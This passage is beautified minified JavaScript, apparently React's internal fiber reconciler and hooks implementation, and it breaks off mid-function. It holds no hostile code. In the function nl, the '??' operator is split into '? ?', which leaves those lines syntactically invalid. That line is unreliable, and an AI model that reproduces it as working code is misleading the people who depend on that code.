function yu(e, t, n) {
    if (e = t.effects, t.effects = null, e !== null)
        for (t = 0; t < e.length; t++) {
            var r = e[t],
                i = r.callback;
            if (i !== null) {
                if (r.callback = null, r = n, typeof i != "function") throw Error(x(191, i));
                i.call(r)
            }
        }
}
var Vf = new Uc.Component().refs;

function Hl(e, t, n, r) {
    t = e.memoizedState, n = n(r, t), n = n == null ? t : G({}, t, n), e.memoizedState = n, e.lanes === 0 && (e.updateQueue.baseState = n)
}
var ha = {
    isMounted: function(e) {
        return (e = e._reactInternals) ? rn(e) === e : !1
    },
    enqueueSetState: function(e, t, n) {
        e = e._reactInternals;
        var r = he(),
            i = At(e),
            a = rt(r, i);
        a.payload = t, n != null && (a.callback = n), t = Pt(e, a, i), t !== null && (We(t, e, i, r), Ei(t, e, i))
    },
    enqueueReplaceState: function(e, t, n) {
        e = e._reactInternals;
        var r = he(),
            i = At(e),
            a = rt(r, i);
        a.tag = 1, a.payload = t, n != null && (a.callback = n), t = Pt(e, a, i), t !== null && (We(t, e, i, r), Ei(t, e, i))
    },
    enqueueForceUpdate: function(e, t) {
        e = e._reactInternals;
        var n = he(),
            r = At(e),
            i = rt(n, r);
        i.tag = 2, t != null && (i.callback = t), t = Pt(e, i, r), t !== null && (We(t, e, r, n), Ei(t, e, r))
    }
};

function wu(e, t, n, r, i, a, l) {
    return e = e.stateNode, typeof e.shouldComponentUpdate == "function" ? e.shouldComponentUpdate(r, a, l) : t.prototype && t.prototype.isPureReactComponent ? !kr(n, r) || !kr(i, a) : !0
}

function Wf(e, t, n) {
    var r = !1,
        i = bt,
        a = t.contextType;
    return typeof a == "object" && a !== null ? a = Re(a) : (i = xe(t) ? Zt : pe.current, r = t.contextTypes, a = (r = r != null) ? On(e, i) : bt), t = new t(n, a), e.memoizedState = t.state !== null && t.state !== void 0 ? t.state : null, t.updater = ha, e.stateNode = t, t._reactInternals = e, r && (e = e.stateNode, e.__reactInternalMemoizedUnmaskedChildContext = i, e.__reactInternalMemoizedMaskedChildContext = a), t
}

function ku(e, t, n, r) {
    e = t.state, typeof t.componentWillReceiveProps == "function" && t.componentWillReceiveProps(n, r), typeof t.UNSAFE_componentWillReceiveProps == "function" && t.UNSAFE_componentWillReceiveProps(n, r), t.state !== e && ha.enqueueReplaceState(t, t.state, null)
}

function Vl(e, t, n, r) {
    var i = e.stateNode;
    i.props = n, i.state = e.memoizedState, i.refs = Vf, Xo(e);
    var a = t.contextType;
    typeof a == "object" && a !== null ? i.context = Re(a) : (a = xe(t) ? Zt : pe.current, i.context = On(e, a)), i.state = e.memoizedState, a = t.getDerivedStateFromProps, typeof a == "function" && (Hl(e, t, a, n), i.state = e.memoizedState), typeof t.getDerivedStateFromProps == "function" || typeof i.getSnapshotBeforeUpdate == "function" || typeof i.UNSAFE_componentWillMount != "function" && typeof i.componentWillMount != "function" || (t = i.state, typeof i.componentWillMount == "function" && i.componentWillMount(), typeof i.UNSAFE_componentWillMount == "function" && i.UNSAFE_componentWillMount(), t !== i.state && ha.enqueueReplaceState(i, i.state, null), Ki(e, n, i, r), i.state = e.memoizedState), typeof i.componentDidMount == "function" && (e.flags |= 4194308)
}

function Gn(e, t, n) {
    if (e = n.ref, e !== null && typeof e != "function" && typeof e != "object") {
        if (n._owner) {
            if (n = n._owner, n) {
                if (n.tag !== 1) throw Error(x(309));
                var r = n.stateNode
            }
            if (!r) throw Error(x(147, e));
            var i = r,
                a = "" + e;
            return t !== null && t.ref !== null && typeof t.ref == "function" && t.ref._stringRef === a ? t.ref : (t = function(l) {
                var o = i.refs;
                o === Vf && (o = i.refs = {}), l === null ? delete o[a] : o[a] = l
            }, t._stringRef = a, t)
        }
        if (typeof e != "string") throw Error(x(284));
        if (!n._owner) throw Error(x(290, e))
    }
    return e
}

function ii(e, t) {
    throw e = Object.prototype.toString.call(t), Error(x(31, e === "[object Object]" ? "object with keys {" + Object.keys(t).join(", ") + "}" : e))
}

function xu(e) {
    var t = e._init;
    return t(e._payload)
}

function Qf(e) {
    function t(p, c) {
        if (e) {
            var h = p.deletions;
            h === null ? (p.deletions = [c], p.flags |= 16) : h.push(c)
        }
    }

    function n(p, c) {
        if (!e) return null;
        for (; c !== null;) t(p, c), c = c.sibling;
        return null
    }

    function r(p, c) {
        for (p = new Map; c !== null;) c.key !== null ? p.set(c.key, c) : p.set(c.index, c), c = c.sibling;
        return p
    }

    function i(p, c) {
        return p = It(p, c), p.index = 0, p.sibling = null, p
    }

    function a(p, c, h) {
        return p.index = h, e ? (h = p.alternate, h !== null ? (h = h.index, h < c ? (p.flags |= 2, c) : h) : (p.flags |= 2, c)) : (p.flags |= 1048576, c)
    }

    function l(p) {
        return e && p.alternate === null && (p.flags |= 2), p
    }

    function o(p, c, h, y) {
        return c === null || c.tag !== 6 ? (c = il(h, p.mode, y), c.return = p, c) : (c = i(c, h), c.return = p, c)
    }

    function s(p, c, h, y) {
        var S = h.type;
        return S === on ? f(p, c, h.props.children, y, h.key) : c !== null && (c.elementType === S || typeof S == "object" && S !== null && S.$$typeof === ht && xu(S) === c.type) ? (y = i(c, h.props), y.ref = Gn(p, c, h), y.return = p, y) : (y = Ii(h.type, h.key, h.props, null, p.mode, y), y.ref = Gn(p, c, h), y.return = p, y)
    }

    function u(p, c, h, y) {
        return c === null || c.tag !== 4 || c.stateNode.containerInfo !== h.containerInfo || c.stateNode.implementation !== h.implementation ? (c = al(h, p.mode, y), c.return = p, c) : (c = i(c, h.children || []), c.return = p, c)
    }

    function f(p, c, h, y, S) {
        return c === null || c.tag !== 7 ? (c = Gt(h, p.mode, y, S), c.return = p, c) : (c = i(c, h), c.return = p, c)
    }

    function m(p, c, h) {
        if (typeof c == "string" && c !== "" || typeof c == "number") return c = il("" + c, p.mode, h), c.return = p, c;
        if (typeof c == "object" && c !== null) {
            switch (c.$$typeof) {
                case Kr:
                    return h = Ii(c.type, c.key, c.props, null, p.mode, h), h.ref = Gn(p, null, c), h.return = p, h;
                case ln:
                    return c = al(c, p.mode, h), c.return = p, c;
                case ht:
                    var y = c._init;
                    return m(p, y(c._payload), h)
            }
            if (qn(c) || Vn(c)) return c = Gt(c, p.mode, h, null), c.return = p, c;
            ii(p, c)
        }
        return null
    }

    function v(p, c, h, y) {
        var S = c !== null ? c.key : null;
        if (typeof h == "string" && h !== "" || typeof h == "number") return S !== null ? null : o(p, c, "" + h, y);
        if (typeof h == "object" && h !== null) {
            switch (h.$$typeof) {
                case Kr:
                    return h.key === S ? s(p, c, h, y) : null;
                case ln:
                    return h.key === S ? u(p, c, h, y) : null;
                case ht:
                    return S = h._init, v(p, c, S(h._payload), y)
            }
            if (qn(h) || Vn(h)) return S !== null ? null : f(p, c, h, y, null);
            ii(p, h)
        }
        return null
    }

    function g(p, c, h, y, S) {
        if (typeof y == "string" && y !== "" || typeof y == "number") return p = p.get(h) || null, o(c, p, "" + y, S);
        if (typeof y == "object" && y !== null) {
            switch (y.$$typeof) {
                case Kr:
                    return p = p.get(y.key === null ? h : y.key) || null, s(c, p, y, S);
                case ln:
                    return p = p.get(y.key === null ? h : y.key) || null, u(c, p, y, S);
                case ht:
                    var P = y._init;
                    return g(p, c, h, P(y._payload), S)
            }
            if (qn(y) || Vn(y)) return p = p.get(h) || null, f(c, p, y, S, null);
            ii(c, y)
        }
        return null
    }

    function w(p, c, h, y) {
        for (var S = null, P = null, j = c, O = c = 0, F = null; j !== null && O < h.length; O++) {
            j.index > O ? (F = j, j = null) : F = j.sibling;
            var L = v(p, j, h[O], y);
            if (L === null) {
                j === null && (j = F);
                break
            }
            e && j && L.alternate === null && t(p, j), c = a(L, c, O), P === null ? S = L : P.sibling = L, P = L, j = F
        }
        if (O === h.length) return n(p, j), Q && Ut(p, O), S;
        if (j === null) {
            for (; O < h.length; O++) j = m(p, h[O], y), j !== null && (c = a(j, c, O), P === null ? S = j : P.sibling = j, P = j);
            return Q && Ut(p, O), S
        }
        for (j = r(p, j); O < h.length; O++) F = g(j, p, O, h[O], y), F !== null && (e && F.alternate !== null && j.delete(F.key === null ? O : F.key), c = a(F, c, O), P === null ? S = F : P.sibling = F, P = F);
        return e && j.forEach(function(De) {
            return t(p, De)
        }), Q && Ut(p, O), S
    }

    function k(p, c, h, y) {
        var S = Vn(h);
        if (typeof S != "function") throw Error(x(150));
        if (h = S.call(h), h == null) throw Error(x(151));
        for (var P = S = null, j = c, O = c = 0, F = null, L = h.next(); j !== null && !L.done; O++, L = h.next()) {
            j.index > O ? (F = j, j = null) : F = j.sibling;
            var De = v(p, j, L.value, y);
            if (De === null) {
                j === null && (j = F);
                break
            }
            e && j && De.alternate === null && t(p, j), c = a(De, c, O), P === null ? S = De : P.sibling = De, P = De, j = F
        }
        if (L.done) return n(p, j), Q && Ut(p, O), S;
        if (j === null) {
            for (; !L.done; O++, L = h.next()) L = m(p, L.value, y), L !== null && (c = a(L, c, O), P === null ? S = L : P.sibling = L, P = L);
            return Q && Ut(p, O), S
        }
        for (j = r(p, j); !L.done; O++, L = h.next()) L = g(j, p, O, L.value, y), L !== null && (e && L.alternate !== null && j.delete(L.key === null ? O : L.key), c = a(L, c, O), P === null ? S = L : P.sibling = L, P = L);
        return e && j.forEach(function(Bn) {
            return t(p, Bn)
        }), Q && Ut(p, O), S
    }

    function E(p, c, h, y) {
        if (typeof h == "object" && h !== null && h.type === on && h.key === null && (h = h.props.children), typeof h == "object" && h !== null) {
            switch (h.$$typeof) {
                case Kr:
                    e: {
                        for (var S = h.key, P = c; P !== null;) {
                            if (P.key === S) {
                                if (S = h.type, S === on) {
                                    if (P.tag === 7) {
                                        n(p, P.sibling), c = i(P, h.props.children), c.return = p, p = c;
                                        break e
                                    }
                                } else if (P.elementType === S || typeof S == "object" && S !== null && S.$$typeof === ht && xu(S) === P.type) {
                                    n(p, P.sibling), c = i(P, h.props), c.ref = Gn(p, P, h), c.return = p, p = c;
                                    break e
                                }
                                n(p, P);
                                break
                            } else t(p, P);
                            P = P.sibling
                        }
                        h.type === on ? (c = Gt(h.props.children, p.mode, y, h.key), c.return = p, p = c) : (y = Ii(h.type, h.key, h.props, null, p.mode, y), y.ref = Gn(p, c, h), y.return = p, p = y)
                    }
                    return l(p);
                case ln:
                    e: {
                        for (P = h.key; c !== null;) {
                            if (c.key === P)
                                if (c.tag === 4 && c.stateNode.containerInfo === h.containerInfo && c.stateNode.implementation === h.implementation) {
                                    n(p, c.sibling), c = i(c, h.children || []), c.return = p, p = c;
                                    break e
                                } else {
                                    n(p, c);
                                    break
                                }
                            else t(p, c);
                            c = c.sibling
                        }
                        c = al(h, p.mode, y),
                        c.return = p,
                        p = c
                    }
                    return l(p);
                case ht:
                    return P = h._init, E(p, c, P(h._payload), y)
            }
            if (qn(h)) return w(p, c, h, y);
            if (Vn(h)) return k(p, c, h, y);
            ii(p, h)
        }
        return typeof h == "string" && h !== "" || typeof h == "number" ? (h = "" + h, c !== null && c.tag === 6 ? (n(p, c.sibling), c = i(c, h), c.return = p, p = c) : (n(p, c), c = il(h, p.mode, y), c.return = p, p = c), l(p)) : n(p, c)
    }
    return E
}
var Tn = Qf(!0),
    Yf = Qf(!1),
    Ur = {},
    qe = Mt(Ur),
    Cr = Mt(Ur),
    Nr = Mt(Ur);

function Wt(e) {
    if (e === Ur) throw Error(x(174));
    return e
}

function Jo(e, t) {
    switch (U(Nr, t), U(Cr, e), U(qe, Ur), e = t.nodeType, e) {
        case 9:
        case 11:
            t = (t = t.documentElement) ? t.namespaceURI : xl(null, "");
            break;
        default:
            e = e === 8 ? t.parentNode : t, t = e.namespaceURI || null, e = e.tagName, t = xl(t, e)
    }
    V(qe), U(qe, t)
}

function zn() {
    V(qe), V(Cr), V(Nr)
}

function Kf(e) {
    Wt(Nr.current);
    var t = Wt(qe.current),
        n = xl(t, e.type);
    t !== n && (U(Cr, e), U(qe, n))
}

function qo(e) {
    Cr.current === e && (V(qe), V(Cr))
}
var Y = Mt(0);

function Gi(e) {
    for (var t = e; t !== null;) {
        if (t.tag === 13) {
            var n = t.memoizedState;
            if (n !== null && (n = n.dehydrated, n === null || n.data === "$?" || n.data === "$!")) return t
        } else if (t.tag === 19 && t.memoizedProps.revealOrder !== void 0) {
            if (t.flags & 128) return t
        } else if (t.child !== null) {
            t.child.return = t, t = t.child;
            continue
        }
        if (t === e) break;
        for (; t.sibling === null;) {
            if (t.return === null || t.return === e) return null;
            t = t.return
        }
        t.sibling.return = t.return, t = t.sibling
    }
    return null
}
var qa = [];

function $o() {
    for (var e = 0; e < qa.length; e++) qa[e]._workInProgressVersionPrimary = null;
    qa.length = 0
}
var Ci = ft.ReactCurrentDispatcher,
    $a = ft.ReactCurrentBatchConfig,
    Jt = 0,
    K = null,
    ee = null,
    ie = null,
    Zi = !1,
    or = !1,
    Pr = 0,
    Ah = 0;

function ce() {
    throw Error(x(321))
}

function es(e, t) {
    if (t === null) return !1;
    for (var n = 0; n < t.length && n < e.length; n++)
        if (!Qe(e[n], t[n])) return !1;
    return !0
}

function ts(e, t, n, r, i, a) {
    if (Jt = a, K = t, t.memoizedState = null, t.updateQueue = null, t.lanes = 0, Ci.current = e === null || e.memoizedState === null ? Th : zh, e = n(r, i), or) {
        a = 0;
        do {
            if (or = !1, Pr = 0, 25 <= a) throw Error(x(301));
            a += 1, ie = ee = null, t.updateQueue = null, Ci.current = Lh, e = n(r, i)
        } while (or)
    }
    if (Ci.current = Xi, t = ee !== null && ee.next !== null, Jt = 0, ie = ee = K = null, Zi = !1, t) throw Error(x(300));
    return e
}

function ns() {
    var e = Pr !== 0;
    return Pr = 0, e
}

function Ke() {
    var e = {
        memoizedState: null,
        baseState: null,
        baseQueue: null,
        queue: null,
        next: null
    };
    return ie === null ? K.memoizedState = ie = e : ie = ie.next = e, ie
}

function Me() {
    if (ee === null) {
        var e = K.alternate;
        e = e !== null ? e.memoizedState : null
    } else e = ee.next;
    var t = ie === null ? K.memoizedState : ie.next;
    if (t !== null) ie = t, ee = e;
    else {
        if (e === null) throw Error(x(310));
        ee = e, e = {
            memoizedState: ee.memoizedState,
            baseState: ee.baseState,
            baseQueue: ee.baseQueue,
            queue: ee.queue,
            next: null
        }, ie === null ? K.memoizedState = ie = e : ie = ie.next = e
    }
    return ie
}

function jr(e, t) {
    return typeof t == "function" ? t(e) : t
}

function el(e) {
    var t = Me(),
        n = t.queue;
    if (n === null) throw Error(x(311));
    n.lastRenderedReducer = e;
    var r = ee,
        i = r.baseQueue,
        a = n.pending;
    if (a !== null) {
        if (i !== null) {
            var l = i.next;
            i.next = a.next, a.next = l
        }
        r.baseQueue = i = a, n.pending = null
    }
    if (i !== null) {
        a = i.next, r = r.baseState;
        var o = l = null,
            s = null,
            u = a;
        do {
            var f = u.lane;
            if ((Jt & f) === f) s !== null && (s = s.next = {
                lane: 0,
                action: u.action,
                hasEagerState: u.hasEagerState,
                eagerState: u.eagerState,
                next: null
            }), r = u.hasEagerState ? u.eagerState : e(r, u.action);
            else {
                var m = {
                    lane: f,
                    action: u.action,
                    hasEagerState: u.hasEagerState,
                    eagerState: u.eagerState,
                    next: null
                };
                s === null ? (o = s = m, l = r) : s = s.next = m, K.lanes |= f, qt |= f
            }
            u = u.next
        } while (u !== null && u !== a);
        s === null ? l = r : s.next = o, Qe(r, t.memoizedState) || (we = !0), t.memoizedState = r, t.baseState = l, t.baseQueue = s, n.lastRenderedState = r
    }
    if (e = n.interleaved, e !== null) {
        i = e;
        do a = i.lane, K.lanes |= a, qt |= a, i = i.next; while (i !== e)
    } else i === null && (n.lanes = 0);
    return [t.memoizedState, n.dispatch]
}

function tl(e) {
    var t = Me(),
        n = t.queue;
    if (n === null) throw Error(x(311));
    n.lastRenderedReducer = e;
    var r = n.dispatch,
        i = n.pending,
        a = t.memoizedState;
    if (i !== null) {
        n.pending = null;
        var l = i = i.next;
        do a = e(a, l.action), l = l.next; while (l !== i);
        Qe(a, t.memoizedState) || (we = !0), t.memoizedState = a, t.baseQueue === null && (t.baseState = a), n.lastRenderedState = a
    }
    return [a, r]
}

function Gf() {}

function Zf(e, t) {
    var n = K,
        r = Me(),
        i = t(),
        a = !Qe(r.memoizedState, i);
    if (a && (r.memoizedState = i, we = !0), r = r.queue, rs(qf.bind(null, n, r, e), [e]), r.getSnapshot !== t || a || ie !== null && ie.memoizedState.tag & 1) {
        if (n.flags |= 2048, Ar(9, Jf.bind(null, n, r, i, t), void 0, null), ae === null) throw Error(x(349));
        Jt & 30 || Xf(n, t, i)
    }
    return i
}

function Xf(e, t, n) {
    e.flags |= 16384, e = {
        getSnapshot: t,
        value: n
    }, t = K.updateQueue, t === null ? (t = {
        lastEffect: null,
        stores: null
    }, K.updateQueue = t, t.stores = [e]) : (n = t.stores, n === null ? t.stores = [e] : n.push(e))
}

function Jf(e, t, n, r) {
    t.value = n, t.getSnapshot = r, $f(t) && ed(e)
}

function qf(e, t, n) {
    return n(function() {
        $f(t) && ed(e)
    })
}

function $f(e) {
    var t = e.getSnapshot;
    e = e.value;
    try {
        var n = t();
        return !Qe(e, n)
    } catch {
        return !0
    }
}

function ed(e) {
    var t = lt(e, 1);
    t !== null && We(t, e, 1, -1)
}

function Su(e) {
    var t = Ke();
    return typeof e == "function" && (e = e()), t.memoizedState = t.baseState = e, e = {
        pending: null,
        interleaved: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: jr,
        lastRenderedState: e
    }, t.queue = e, e = e.dispatch = bh.bind(null, K, e), [t.memoizedState, e]
}

function Ar(e, t, n, r) {
    return e = {
        tag: e,
        create: t,
        destroy: n,
        deps: r,
        next: null
    }, t = K.updateQueue, t === null ? (t = {
        lastEffect: null,
        stores: null
    }, K.updateQueue = t, t.lastEffect = e.next = e) : (n = t.lastEffect, n === null ? t.lastEffect = e.next = e : (r = n.next, n.next = e, e.next = r, t.lastEffect = e)), e
}

function td() {
    return Me().memoizedState
}

function Ni(e, t, n, r) {
    var i = Ke();
    K.flags |= e, i.memoizedState = Ar(1 | t, n, void 0, r === void 0 ? null : r)
}

function va(e, t, n, r) {
    var i = Me();
    r = r === void 0 ? null : r;
    var a = void 0;
    if (ee !== null) {
        var l = ee.memoizedState;
        if (a = l.destroy, r !== null && es(r, l.deps)) {
            i.memoizedState = Ar(t, n, a, r);
            return
        }
    }
    K.flags |= e, i.memoizedState = Ar(1 | t, n, a, r)
}

function Eu(e, t) {
    return Ni(8390656, 8, e, t)
}

function rs(e, t) {
    return va(2048, 8, e, t)
}

function nd(e, t) {
    return va(4, 2, e, t)
}

function rd(e, t) {
    return va(4, 4, e, t)
}

function id(e, t) {
    if (typeof t == "function") return e = e(), t(e),
        function() {
            t(null)
        };
    if (t != null) return e = e(), t.current = e,
        function() {
            t.current = null
        }
}

function ad(e, t, n) {
    return n = n != null ? n.concat([e]) : null, va(4, 4, id.bind(null, t, e), n)
}

function is() {}

function ld(e, t) {
    var n = Me();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && es(t, r[1]) ? r[0] : (n.memoizedState = [e, t], e)
}

function od(e, t) {
    var n = Me();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && es(t, r[1]) ? r[0] : (e = e(), n.memoizedState = [e, t], e)
}

function sd(e, t, n) {
    return Jt & 21 ? (Qe(n, t) || (n = ff(), K.lanes |= n, qt |= n, e.baseState = !0), t) : (e.baseState && (e.baseState = !1, we = !0), e.memoizedState = n)
}

function Ih(e, t) {
    var n = _;
    _ = n !== 0 && 4 > n ? n : 4, e(!0);
    var r = $a.transition;
    $a.transition = {};
    try {
        e(!1), t()
    } finally {
        _ = n, $a.transition = r
    }
}

function ud() {
    return Me().memoizedState
}

function Oh(e, t, n) {
    var r = At(e);
    if (n = {
            lane: r,
            action: n,
            hasEagerState: !1,
            eagerState: null,
            next: null
        }, cd(e)) fd(t, n);
    else if (n = Bf(e, t, n, r), n !== null) {
        var i = he();
        We(n, e, r, i), dd(n, t, r)
    }
}

function bh(e, t, n) {
    var r = At(e),
        i = {
            lane: r,
            action: n,
            hasEagerState: !1,
            eagerState: null,
            next: null
        };
    if (cd(e)) fd(t, i);
    else {
        var a = e.alternate;
        if (e.lanes === 0 && (a === null || a.lanes === 0) && (a = t.lastRenderedReducer, a !== null)) try {
            var l = t.lastRenderedState,
                o = a(l, n);
            if (i.hasEagerState = !0, i.eagerState = o, Qe(o, l)) {
                var s = t.interleaved;
                s === null ? (i.next = i, Zo(t)) : (i.next = s.next, s.next = i), t.interleaved = i;
                return
            }
        } catch {} finally {}
        n = Bf(e, t, i, r), n !== null && (i = he(), We(n, e, r, i), dd(n, t, r))
    }
}

function cd(e) {
    var t = e.alternate;
    return e === K || t !== null && t === K
}

function fd(e, t) {
    or = Zi = !0;
    var n = e.pending;
    n === null ? t.next = t : (t.next = n.next, n.next = t), e.pending = t
}

function dd(e, t, n) {
    if (n & 4194240) {
        var r = t.lanes;
        r &= e.pendingLanes, n |= r, t.lanes = n, Ro(e, n)
    }
}
var Xi = {
        readContext: Re,
        useCallback: ce,
        useContext: ce,
        useEffect: ce,
        useImperativeHandle: ce,
        useInsertionEffect: ce,
        useLayoutEffect: ce,
        useMemo: ce,
        useReducer: ce,
        useRef: ce,
        useState: ce,
        useDebugValue: ce,
        useDeferredValue: ce,
        useTransition: ce,
        useMutableSource: ce,
        useSyncExternalStore: ce,
        useId: ce,
        unstable_isNewReconciler: !1
    },
    Th = {
        readContext: Re,
        useCallback: function(e, t) {
            return Ke().memoizedState = [e, t === void 0 ? null : t], e
        },
        useContext: Re,
        useEffect: Eu,
        useImperativeHandle: function(e, t, n) {
            return n = n != null ? n.concat([e]) : null, Ni(4194308, 4, id.bind(null, t, e), n)
        },
        useLayoutEffect: function(e, t) {
            return Ni(4194308, 4, e, t)
        },
        useInsertionEffect: function(e, t) {
            return Ni(4, 2, e, t)
        },
        useMemo: function(e, t) {
            var n = Ke();
            return t = t === void 0 ? null : t, e = e(), n.memoizedState = [e, t], e
        },
        useReducer: function(e, t, n) {
            var r = Ke();
            return t = n !== void 0 ? n(t) : t, r.memoizedState = r.baseState = t, e = {
                pending: null,
                interleaved: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: e,
                lastRenderedState: t
            }, r.queue = e, e = e.dispatch = Oh.bind(null, K, e), [r.memoizedState, e]
        },
        useRef: function(e) {
            var t = Ke();
            return e = {
                current: e
            }, t.memoizedState = e
        },
        useState: Su,
        useDebugValue: is,
        useDeferredValue: function(e) {
            return Ke().memoizedState = e
        },
        useTransition: function() {
            var e = Su(!1),
                t = e[0];
            return e = Ih.bind(null, e[1]), Ke().memoizedState = e, [t, e]
        },
        useMutableSource: function() {},
        useSyncExternalStore: function(e, t, n) {
            var r = K,
                i = Ke();
            if (Q) {
                if (n === void 0) throw Error(x(407));
                n = n()
            } else {
                if (n = t(), ae === null) throw Error(x(349));
                Jt & 30 || Xf(r, t, n)
            }
            i.memoizedState = n;
            var a = {
                value: n,
                getSnapshot: t
            };
            return i.queue = a, Eu(qf.bind(null, r, a, e), [e]), r.flags |= 2048, Ar(9, Jf.bind(null, r, a, n, t), void 0, null), n
        },
        useId: function() {
            var e = Ke(),
                t = ae.identifierPrefix;
            if (Q) {
                var n = nt,
                    r = tt;
                n = (r & ~(1 << 32 - Ve(r) - 1)).toString(32) + n, t = ":" + t + "R" + n, n = Pr++, 0 < n && (t += "H" + n.toString(32)), t += ":"
            } else n = Ah++, t = ":" + t + "r" + n.toString(32) + ":";
            return e.memoizedState = t
        },
        unstable_isNewReconciler: !1
    },
    zh = {
        readContext: Re,
        useCallback: ld,
        useContext: Re,
        useEffect: rs,
        useImperativeHandle: ad,
        useInsertionEffect: nd,
        useLayoutEffect: rd,
        useMemo: od,
        useReducer: el,
        useRef: td,
        useState: function() {
            return el(jr)
        },
        useDebugValue: is,
        useDeferredValue: function(e) {
            var t = Me();
            return sd(t, ee.memoizedState, e)
        },
        useTransition: function() {
            var e = el(jr)[0],
                t = Me().memoizedState;
            return [e, t]
        },
        useMutableSource: Gf,
        useSyncExternalStore: Zf,
        useId: ud,
        unstable_isNewReconciler: !1
    },
    Lh = {
        readContext: Re,
        useCallback: ld,
        useContext: Re,
        useEffect: rs,
        useImperativeHandle: ad,
        useInsertionEffect: nd,
        useLayoutEffect: rd,
        useMemo: od,
        useReducer: tl,
        useRef: td,
        useState: function() {
            return tl(jr)
        },
        useDebugValue: is,
        useDeferredValue: function(e) {
            var t = Me();
            return ee === null ? t.memoizedState = e : sd(t, ee.memoizedState, e)
        },
        useTransition: function() {
            var e = tl(jr)[0],
                t = Me().memoizedState;
            return [e, t]
        },
        useMutableSource: Gf,
        useSyncExternalStore: Zf,
        useId: ud,
        unstable_isNewReconciler: !1
    };

function Ln(e, t) {
    try {
        var n = "",
            r = t;
        do n += sm(r), r = r.return; while (r);
        var i = n
    } catch (a) {
        i = `
Error generating stack: ` + a.message + `
` + a.stack
    }
    return {
        value: e,
        source: t,
        stack: i,
        digest: null
    }
}

function nl(e, t, n) {
    return {
        value: e,
        source: null,
        stack: n ? ? null,
        digest: t ? ? null
    }
}

function Wl(e, t) {
    try {
        console.error(t.value)
    } catch (n) {
        setTimeout(function() {
            throw n
        })
    }
}
var Rh = typeof WeakMap == "function" ? WeakMap : Map;

function pd(e, t, n) {
    n = rt(-1, n), n.tag = 3, n.payload = {
        element: null
    };
    var r = t.value;
    return n.callback = function() {
        qi || (qi = !0, eo = r), Wl(e, t)
    }, n
}

function md(e, t, n) {
    n = rt(-1, n), n.tag = 3;
    var r = e.type.getDerivedStateFromError;
    if (typeof r == "function") {
        var i = t.value;
        n.payload = function() {
            return r(i)
        }, n.callback = function() {
            Wl(e, t)
        }
    }
    var a = e.stateNode;
    return a !== null && typeof a.componentDidCatch == "function" && (n.callback = function() {
        Wl(e, t), typeof r != "function" && (jt === null ? jt = new Set([this]) : jt.add(this));
        var l = t.stack;
        this.componentDidCatch(t.value, {
            componentStack: l !== null ? l : ""
        })
    }), n
}

function Cu(e, t, n) {
    var r = e.pingCache;
    if (r === null) {
        r = e.pingCache = new Rh;
        var i = new Set;
        r.set(t, i)
    } else i = r.get(t), i === void 0 && (i = new Set, r.set(t, i));
    i.has(n) || (i.add(n), e = Zh.bind(null, e, t, n), t.then(e, e))
}

function Nu(e) {
    do {
        var t;
        if ((t = e.tag === 13) && (t = e.memoizedState, t = t !== null ? t.dehydrated !== null : !0), t) return e;
        e = e.return
    } while (e !== null);
    return null
}

function Pu(e, t, n, r, i) {
    return e.mode & 1 ? (e.flags |= 65536, e.lanes = i, e) : (e === t ? e.flags |= 65536 : (e.flags |= 128, n.flags |= 131072, n.flags &= -52805, n.tag === 1 && (n.alternate === null ? n.tag = 17 : (t = rt(-1, 1), t.tag = 2, Pt(n, t, 1))), n.lanes |= 1), e)
}
var Mh = ft.ReactCurrentOwner,
    we = !1;

function me(e, t, n, r) {
    t.child = e === null ? Yf(t, null, n, r) : Tn(t, e.child, n, r)
}

function ju(e, t, n, r, i) {
    n = n.render;
    var a = t.ref;
    return Nn(t, i), r = ts(e, t, n, r, a, i), n = ns(), e !== null && !we ? (t.updateQueue = e.updateQueue, t.flags &= -2053, e.lanes &= ~i, ot(e, t, i)) : (Q && n && Vo(t), t.flags |= 1, me(e, t, r, i), t.child)
}

function Au(e, t, n, r, i) {
    if (e === null) {
        var a = n.type;
        return typeof a == "function" && !ds(a) && a.defaultProps === void 0 && n.compare === null && n.defaultProps === void 0 ? (t.tag = 15, t.type = a, hd(e, t, a, r, i)) : (e = Ii(n.type, null, r, t, t.mode, i), e.ref = t.ref, e.return = t, t.child = e)
    }
    if (a = e.child, !(e.lanes & i)) {
        var l = a.memoizedProps;
        if (n = n.compare, n = n !== null ? n : kr, n(l, r) && e.ref === t.ref) return ot(e, t, i)
    }
    return t.flags |= 1, e = It(a, r), e.ref = t.ref, e.return = t, t.child = e
}

function hd(e, t, n, r, i) {
    if (e !== null) {
        var a = e.memoizedProps;
        if (kr(a, r) && e.ref === t.ref)
            if (we = !1, t.pendingProps = r = a, (e.lanes & i) !== 0) e.flags & 131072 && (we = !0);
            else return t.lanes = e.lanes, ot(e, t, i)
    }
    return Ql(e, t, n, r, i)
}

function vd(e, t, n) {
    var r = t.pendingProps,
        i = r.children,
        a = e !== null ? e.memoizedState : null;
    if (r.mode === "hidden")
        if (!(t.mode & 1)) t.memoizedState = {
            baseLanes: 0,
            cachePool: null,
            transitions: null
        }, U(gn, Ce), Ce |= n;
        else {
            if (!(n & 1073741824)) return e = a !== null ? a.baseLanes | n : n, t.lanes = t.childLanes = 1073741824, t.memoizedState = {
                baseLanes: e,
                cachePool: null,
                transitions: null
            }, t.updateQueue = null, U(gn, Ce), Ce |= e, null;
            t.memoizedState = {
                baseLanes: 0,
                cachePool: null,
                transitions: null
            }, r = a !== null ? a.baseLanes : n, U(gn, Ce), Ce |= r
        }
    else a !== null ? (r = a.baseLanes | n, t.memoizedState = null) : r = n, U(gn, Ce), Ce |= r;
    return me(e, t, i, n), t.child
}

function gd(e, t) {
    var n = t.ref;
    (e === null && n !== null || e !== null && e.ref !== n) && (t.flags |= 512, t.flags |= 2097152)
}

function Ql(e, t, n, r, i) {
    var a = xe(n) ? Zt : pe.current;
    return a = On(t, a), Nn(t, i), n = ts(e, t, n, r, a, i), r = ns(), e !== null && !we ? (t.updateQueue = e.updateQueue, t.flags &= -2053, e.lanes &= ~i, ot(e, t, i)) : (Q && r && Vo(t), t.flags |= 1, me(e, t, n, i), t.child)
}

function Iu(e, t, n, r, i) {
    if (xe(n)) {
        var a = !0;
        Hi(t)
    } else a = !1;
    if (Nn(t, i), t.stateNode === null) Pi(e, t), Wf(t, n, r), Vl(t, n, r, i), r = !0;
    else if (e === null) {
        var l = t.stateNode,
